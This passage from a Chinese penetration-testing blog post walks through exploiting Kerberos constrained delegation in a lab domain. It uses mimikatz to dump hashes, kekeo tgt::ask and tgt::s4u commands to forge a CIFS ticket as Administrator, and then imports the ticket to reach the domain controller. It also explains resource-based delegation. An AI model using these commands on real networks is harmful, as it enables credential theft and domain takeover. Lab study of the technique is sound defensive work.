+<p><img src="https://img-blog.csdnimg.cn/img_convert/a9f9afea558d88301e70d2e028613b1f.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果是关于主机的，可以先用mimikatz导出hash。<br><img src="https://img-blog.csdnimg.cn/img_convert/0a9685a8b647d1bf70dd968d57c60387.png" srcset="/img/loading.gif" lazyload><br>然后同样用kekeo请求该用户的 TGT。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">tgt:<span class="hljs-function">:ask</span> <span class="hljs-string">/user</span><span class="hljs-function">:stu1</span>$ <span class="hljs-string">/domain</span><span class="hljs-function">:god.org</span> <span class="hljs-string">/NTLM</span><span class="hljs-function">:xxxxx</span><br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f0147c310fc20152a825a235bd8f67a3.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就可以使用这张 TGT 通过伪造 S4U 请求以 administrator 用户身份请求访问域控 CIFS 的 ST票据。这里为何能伪造S4U请求以任意用户身份访问域控获取ST票据，是因为在Service发送S4U请求时服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的，前提条件是只需要服务已经有通过KDC验证的TGT</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">tgt:s4u <span class="hljs-regexp">/tgt:xxxxxxxx.kirbi /u</span>ser:Administrator@god.org <span class="hljs-regexp">/service:cifs/</span>OWA.GOD.ORG<br></code></pre></div></td></tr></table></figure>
+<p>这里存在两个票据，一个是S4Uself返回的，一个是S4Uproxy返回的。<br><img src="https://img-blog.csdnimg.cn/img_convert/18cc8164d28b237f92fbed0cf0738127.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后用 mimikatz 将 S4Uproxy返回的票据 导入当前会话，即可成功访问域控。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2e13ee90f124365d848346004590fb34.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实如果已经可以登录主机了，就可以通过mimikatz导出主机用户或者服务账户的tgt。服务用户的 TGT 导出后，就可以通过伪造 S4U 请求以 administrator 用户身份请求访问 域控 CIFS 的 ST。不过我这里的主机TGT已经失效了。<br><img src="https://img-blog.csdnimg.cn/img_convert/a078440ce16a278ca7c124be05b26481.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><blockquote>
+<p>如果约束性委派，必须拥有 SeEnableDelegationPrivilege 权限，该特权是敏感的，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012 中引入了基于资源的约束委派。基于资源的约束性委派不需要域管理员权限去设置，而是把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束性委派只能在运行 Windows Server 2012 及以上的域控制器上配置，约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林。</p>
+</blockquote>
+<h4 id="约束性委派与基于资源的约束性委派配置差别"><a href="#约束性委派与基于资源的约束性委派配置差别" class="headerlink" title="约束性委派与基于资源的约束性委派配置差别"></a>约束性委派与基于资源的约束性委派配置差别</h4><blockquote>
+<p>传统的约束委派是正向的，通过修改服务 A 的 msDS-AllowedToDelegateTo 属性，添加服务 B 的 SPN，设置约束委派对象（服务 B），服务 A 便可以模拟用户向域控制器请求访问服务 B 的 ST 服务票据。而基于资源的约束委派则是相反的，通过修改服务 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，添加服务 A 的 SID，从而达到让服务 A 模拟用户访问 B 资源的目的。</p>
+</blockquote>
+<h4 id="基于资源的约束性委派攻击"><a href="#基于资源的约束性委派攻击" class="headerlink" title="基于资源的约束性委派攻击"></a>基于资源的约束性委派攻击</h4><p>这里没有再搭建Windows Server 2012 可以看看这篇文章<a target="_blank" rel="noopener" href="https://blog.zjun.info/tech/kerberos-protocol-to-ticket-forgery/">https://blog.zjun.info/tech/kerberos-protocol-to-ticket-forgery/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/08/2023-2-8-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/">
+                        <span class="hidden-mobile">红日靶场1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
